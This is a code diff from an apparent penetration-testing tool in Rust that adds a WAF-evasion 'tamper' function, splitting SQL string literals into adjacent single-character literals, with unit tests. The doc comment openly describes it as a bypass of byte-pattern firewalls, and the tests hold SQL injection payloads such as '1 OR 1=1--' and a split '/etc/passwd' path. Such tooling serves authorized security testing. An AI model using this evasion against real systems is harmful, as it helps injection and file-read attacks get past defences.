@@ -466,6 +466,100 @@ pub fn json_unicode_alnum(payload: &str) -> String {
     out
 }
 
+/// SQL adjacent-string-literal concatenation — every `'string'` literal of
+/// length ≥ 2 is rewritten as a sequence of single-character adjacent
+/// literals: `'admin'` → `'a' 'd' 'm' 'i' 'n'`.
+///
+/// **Bypass mechanism**: SQL standard (ANSI SQL-92 §5.3) specifies that
+/// two adjacent character-string literals separated only by whitespace
+/// are concatenated by the parser. MySQL, Postgres, SQLite, Oracle, DB2
+/// all implement this. WAF rules that match the literal substring of
+/// well-known credentials or paths (e.g. `'admin'`, `'/etc/passwd'`)
+/// see N unrelated single-character strings instead of one token. The
+/// database rejoins them at parse time — no comments, no CONCAT calls,
+/// no special functions. Pure SQL semantics.
+///
+/// **Idempotent**: every output sub-literal has length 1, below the
+/// split threshold — a second pass leaves the output unchanged.
+///
+/// **Context**: Effective against any byte-pattern WAF inspecting
+/// SQL bodies. Inert outside SQL context (won't fire on non-quoted
+/// payloads).
+#[must_use]
+pub fn sql_adjacent_string_concat(payload: &str) -> String {
+    let mut out = String::with_capacity(payload.len() + 8);
+    let mut chars = payload.chars().peekable();
+    while let Some(ch) = chars.next() {
+        if ch != '\'' {
+            out.push(ch);
+            continue;
+        }
+        let mut literal = String::new();
+        let mut closed = false;
+        while let Some(&next) = chars.peek() {
+            chars.next();
+            if next == '\'' {
+                if chars.peek() == Some(&'\'') {
+                    literal.push('\'');
+                    chars.next();
+                    continue;
+                }
+                closed = true;
+                break;
+            }
+            literal.push(next);
+        }
+        if !closed {
+            out.push('\'');
+            out.push_str(&literal);
+            continue;
+        }
+        // Conservative: literals containing an escaped quote (SQL `''`
+        // produced a `'` inside `literal`) are not split — splitting
+        // across the escape boundary breaks SQL semantics. Pass
+        // through verbatim.
+        if literal.contains('\'') {
+            out.push('\'');
+            for c in literal.chars() {
+                if c == '\'' {
+                    out.push_str("''");
+                } else {
+                    out.push(c);
+                }
+            }
+            out.push('\'');
+            continue;
+        }
+        let lit_chars: Vec<char> = literal.chars().collect();
+        if lit_chars.len() < 2 {
+            out.push('\'');
+            out.push_str(&literal);
+            out.push('\'');
+            continue;
+        }
+        // Single-character split: each char of the literal becomes its
+        // own `'c'` quoted token, joined by single spaces. ANSI SQL-92
+        // §5.3 concatenates them at parse time. Idempotent: each output
+        // sub-literal has length 1 (below the threshold) so a second
+        // pass sees only short literals and produces identical output.
+        let mut first = true;
+        for c in lit_chars {
+            if !first {
+                out.push(' ');
+            }
+            first = false;
+            out.push('\'');
+            if c == '\'' {
+                out.push_str("''");
+            } else {
+                out.push(c);
+            }
+            out.push('\'');
+        }
+    }
+    out
+}
+
 /// Homoglyph substitution — replaces select ASCII characters with visually
 /// identical Unicode characters from other scripts.
 ///
@@ -559,6 +653,65 @@ mod tests {
     #[test]
     fn json_unicode_alnum_empty_input() {
         assert_eq!(json_unicode_alnum(""), "");
+    }
+
+    #[test]
+    fn sql_adjacent_string_concat_basic() {
+        // 'admin' (len 5) → 5 single-char adjacent literals.
+        assert_eq!(sql_adjacent_string_concat("'admin'"), "'a' 'd' 'm' 'i' 'n'");
+    }
+
+    #[test]
+    fn sql_adjacent_string_concat_short_literal_unchanged() {
+        // Length-1 literals must pass through (already minimum).
+        assert_eq!(sql_adjacent_string_concat("'a'"), "'a'");
+        assert_eq!(sql_adjacent_string_concat("''"), "''");
+    }
+
+    #[test]
+    fn sql_adjacent_string_concat_idempotent() {
+        // Well-formed (balanced quotes) payload — the literals 'admin'
+        // and 'root' each shatter into single-char adjacent literals.
+        let once = sql_adjacent_string_concat("WHERE x='admin' OR y='root'");
+        let twice = sql_adjacent_string_concat(&once);
+        assert_eq!(once, twice, "tamper must stabilize on second pass");
+        assert!(once.contains("'a' 'd' 'm' 'i' 'n'"));
+        assert!(once.contains("'r' 'o' 'o' 't'"));
+    }
+
+    #[test]
+    fn sql_adjacent_string_concat_preserves_outside_literal() {
+        // No quoted literal in payload — must be a no-op.
+        assert_eq!(sql_adjacent_string_concat("1 OR 1=1--"), "1 OR 1=1--");
+    }
+
+    #[test]
+    fn sql_adjacent_string_concat_handles_escaped_quote() {
+        // SQL '' escape inside a literal must NOT be split — splitting
+        // across the escape boundary would break semantics
+        // (`'O'B' 'rien'` would parse as 4 tokens, not one string).
+        // Conservative behaviour: pass through verbatim.
+        let out = sql_adjacent_string_concat("'O''Brien'");
+        assert_eq!(out, "'O''Brien'");
+    }
+
+    #[test]
+    fn sql_adjacent_string_concat_unterminated_quote_passthrough() {
+        // Defensive: an unclosed quote must not crash and must not
+        // wrap-then-mistakenly-close. Output should preserve the bytes
+        // verbatim except for the unmatched-quote tail.
+        let out = sql_adjacent_string_concat("'unclosed");
+        assert_eq!(out, "'unclosed");
+    }
+
+    #[test]
+    fn sql_adjacent_string_concat_path_literal_split() {
+        // /etc/passwd path literal is a high-fidelity LFI fingerprint.
+        // 11 chars → 11 single-char literals; the byte sequence
+        // `/etc/passwd` no longer appears contiguously.
+        let out = sql_adjacent_string_concat("'/etc/passwd'");
+        assert_eq!(out, "'/' 'e' 't' 'c' '/' 'p' 'a' 's' 's' 'w' 'd'");
+        assert!(!out.contains("/etc/passwd"));
     }
 
     #[test]
